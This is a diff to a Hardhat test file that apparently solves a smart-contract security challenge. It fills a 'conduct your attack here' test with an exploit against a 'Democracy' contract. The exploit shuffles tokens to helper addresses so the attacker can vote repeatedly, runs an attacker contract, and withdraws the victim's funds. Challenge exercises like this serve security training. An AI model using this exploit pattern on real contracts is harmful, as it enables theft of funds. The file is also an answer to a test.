@@ -26,7 +26,16 @@ describe(NAME, function () {
       })
 
       it("conduct your attack here", async function () {
-          
+          await victimContract.nominateChallenger(attackerWallet.address);
+          const AttackerContractFactory = await ethers.getContractFactory("DemocracyAttacker");
+          const attackerContract = await AttackerContractFactory.deploy(victimContract.address);
+          const helper0 = await attackerContract.helper0();
+          const helper1 = await attackerContract.helper1();
+          await victimContract.connect(attackerWallet).transferFrom(attackerWallet.address, helper0, 0);
+          await victimContract.connect(attackerWallet).vote(attackerWallet.address);
+          await victimContract.connect(attackerWallet).transferFrom(attackerWallet.address, helper1, 1);
+          await attackerContract.attack();
+          await victimContract.connect(attackerWallet).withdrawToAddress(attackerWallet.address);
       });
 
       after(async function () {
